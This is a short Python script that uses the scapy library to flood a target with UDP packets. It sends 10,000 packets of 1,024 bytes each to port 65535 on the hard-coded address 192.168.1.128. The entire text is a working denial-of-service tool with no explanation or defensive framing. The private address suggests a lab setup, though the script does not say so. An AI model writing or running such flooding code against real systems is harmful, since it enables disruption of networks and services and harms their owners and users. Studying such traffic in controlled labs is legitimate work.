from scapy.all import *

def udp_flood(target_ip, packet_count):
    target_port = 65535
    payload = "X"*1024
    packet = IP(dst=target_ip)/UDP(dport=target_port)/payload
    for i in range(packet_count):
        send(packet)
        print(f"Packet UDP {i + 1} send to {target_ip}:{target_port}")

target_ip = "192.168.1.128"
packet_count = 10000
udp_flood(target_ip, packet_count)
